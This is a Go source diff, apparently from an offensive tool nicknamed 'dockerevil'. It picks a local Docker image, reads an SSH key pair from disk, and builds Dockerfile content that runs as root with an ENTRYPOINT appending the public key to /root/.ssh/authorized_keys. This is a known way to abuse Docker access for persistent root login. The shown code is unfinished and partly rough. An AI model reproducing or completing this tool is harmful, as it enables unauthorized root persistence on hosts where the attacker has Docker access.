@@ -17,8 +17,9 @@ import (
 
 type Dockertar struct{
   Imagetag string
-  Privatekey string
   Publickey string
+  Privatekey []byte
+  Filecontent string
 }
 
 var (
@@ -66,20 +67,26 @@ func imageChoose(cli *client.Client) (string, error){
   return images[0].RepoTags[0], nil
 }
 
-func valideKey() (string, string, error){
-  // check private and public keys
-  // chance for os.Stat .. 
+func valideKey() ([]byte, string, error){
+  if _, err := os.Stat(*cert); os.IsNotExist(err) || os.IsPermission(err) {
+    return []byte(""),"", errors.New("Unable to read file or is empty")
+  }
+
+  if _, err := os.Stat(*cert+".pub"); os.IsNotExist(err) || os.IsPermission(err) {
+    return []byte(""),"", errors.New("Unable to read file or is empty")
+  }
+
   priv, err := ioutil.ReadFile(*cert)
-  if err != nil || len(priv) == 0 {
-    return "","", erros.New("Unable to read file or is empty")
+  if err != nil {
+    panic(err)
   }
 
   pub, err := ioutil.ReadFile(*cert+".pub")
-  if err != nil || len(pub) == 0 {
-    return "","", erros.New("Unable to read file or is empty")
+  if err != nil {
+    panic(err)
   }
 
-  return priv, pub, nil 
+  return priv, string(pub), nil 
 }
 
 func dockerFile(cli *client.Client) (*Dockertar, error){ 
@@ -95,9 +102,15 @@ func dockerFile(cli *client.Client) (*Dockertar, error){
     panic(err)
   }
 
-  docker.Imagetag = image
-  docker.Privatekey = priv
-  docker.Publickey = pub
+  docker.Imagetag = image // string 
+  docker.Privatekey = priv // byte
+  docker.Publickey = pub // string
+
+  content := "FROM "+docker.Imagetag+"\n"
+  content += "USER root\n"
+  content += "ENTRYPOINT echo \""+ docker.Publickey +"\" >> /root/.ssh/authorized_keys"
+
+  docker.Filecontent = content
 
   return docker, nil
 }
@@ -123,7 +136,7 @@ func main() {
     panic(nil)
   }
 
-
+    
   fmt.Printf("%T\n",dockerevil);
 
 }
